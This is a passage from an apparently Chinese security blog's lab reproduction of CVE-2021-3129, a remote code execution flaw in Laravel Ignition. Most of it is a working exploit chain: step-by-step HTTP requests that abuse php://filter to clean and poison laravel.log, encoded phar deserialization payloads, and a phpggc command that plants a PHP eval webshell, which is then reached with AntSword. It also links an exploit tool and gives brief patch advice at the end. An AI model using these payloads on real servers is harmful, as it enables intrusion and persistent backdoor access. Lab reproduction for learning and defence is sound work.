class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200633460.png" alt="image-20230910200633460"></p><p>三、发送如下数据包，给Log增加一次前缀</p><blockquote><p><strong>如果出现两次 payload 或者出现部分残留的base64编码允许的字符将影响后续的base64解码</strong>。 可以通过在前后通过加填充字符的方式来调整 payload 的第一个字符下标为奇数 or 偶数，从而影响 utf16-&gt;utf8 的解码，来使得最终只出现一次 payload</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200805099.png" alt="image-20230910200805099"></p><p>四、将编码后的字符写入到log中</p><p>将之前生成的编码后的POC作为viewFile的值，发送数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5058</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=48=00=4B=00=77=00=2F=00=57=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=45=00=44=00=33=00=75=00=36=00=2F=00=44=00=48=00=65=00=41=00=44=00=33=00=72=00=78=00=79=00=57=00=47=00=6E=00=46=00=34=00=6E=00=58=00=49=00=75=00=49=00=6D=00=43=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201007691.png" alt="image-20230910201007691"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201656301.png" alt="image-20230910201656301"></p><p>五、清空干扰字符只留下我们生成的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201424924.png" alt="image-20230910201424924"></p><p><strong>tips:</strong> 这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试</p><p>六、触发phar反序列化</p><p>使用phar://进行反序列化，执行任意代码（<strong>此时需要使用绝对路径</strong>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 210</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",</span></span><br><span class="line"><span class="comment">  "parameters": &#123;</span></span><br><span class="line"><span class="comment">    "variableName": "username",</span></span><br><span class="line"><span class="comment">    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910202053862.png" alt="image-20230910202053862"></p><h4 id="蚁剑连接webshell"><a href="#蚁剑连接webshell" class="headerlink" title="蚁剑连接webshell"></a>蚁剑连接webshell</h4><p>我们可以利用该漏洞<strong>写入Webshell</strong>：</p><p>1.利用phpggc生成对应的phar文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &quot;phar.readonly=0&quot; ./phpggc/phpggc Laravel/RCE5 &quot;system(&apos;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&apos;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&apos;&apos;.join([&apos;=&apos; + hex(ord(i))[2:] + &apos;=00&apos; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910202642109.png" alt="image-20230910202642109"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910203108274.png" alt="image-20230910203108274"></p><p>重复上述利用步骤后，即可连接Webshell ！</p><p>2.清除laravel.log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.给Log增加一次前缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>4.编码后的phar文件写入到log中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=52=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=62=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=63=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=31=00=70=00=59=00=57=00=6D=00=68=00=69=00=51=00=32=00=64=00=72=00=57=00=44=00=46=00=43=00=55=00=46=00=55=00=78=00=55=00=6D=00=4A=00=6B=00=4D=00=6D=00=68=00=32=00=57=00=56=00=63=00=78=00=63=00=46=00=68=00=54=00=61=00=7A=00=64=00=51=00=65=00=6A=00=51=00=39=00=66=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=49=00=43=00=39=00=32=00=59=00=58=00=49=00=76=00=64=00=33=00=64=00=33=00=4C=00=32=00=68=00=30=00=62=00=57=00=77=00=76=00=63=00=32=00=68=00=6C=00=62=00=47=00=77=00=75=00=63=00=47=00=68=00=77=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=41=00=4C=00=66=00=39=00=5A=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=33=00=4E=00=42=00=31=00=67=00=64=00=5A=00=36=00=2B=00=50=00=59=00=72=00=34=00=36=00=79=00=42=00=34=00=71=00=67=00=63=00=67=00=4F=00=4C=00=74=00=59=00=37=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>5.清除干扰字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>6.执行反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发送完以上数据包后，蚁剑进行连接，成功连接</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910203844643.png" alt="image-20230910203844643"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里也可直接使用工具生成webshell进行连接(这里使用的是哥斯拉)</p><p>github地址：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP" target="_blank" rel="noopener">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p><p><img src="https://img-blog.csdnimg.cn/4459b03ef53f41acab26d864a976a9ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910204850323.png" alt="image-20230910204850323"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用了file_get_contents()去读取了一个可控的路径参数，所以这里可以通过phar://协议去触发phar反序列化</p><p>既然路径可控，那么首先想到的就是log文件，虽然log不能直接被当做php执行，但是有了file_get_contents+phar就可以；我们修改可控的viewfile参数后看看log中是什么样的</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/ez9hcsiijj.png" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/kyb4hlb7rv.png" alt="img"></p><p>可以看到日志中写入了3次test，那么怎么才能只保留我们最后的一个payload呢，这里就可以使用filter做清空字符以及去除多余字符的方法。</p><h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.使用白名单限制相关web项目的访问来降低风险；</p><p>2.将 Laravel 框架升级至8.4.3及其以上版本，或者将facade ignition组件升级至 2.5.2 及其以上版本。</p><p><strong>参考链接：</strong></p><p><a href="https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA</a></p><p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p><p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）&quot;&gt;&lt;a href=&quot;#Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）&quot; class=&quot;headerlink&quot; title=&quot;Lara
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</title>
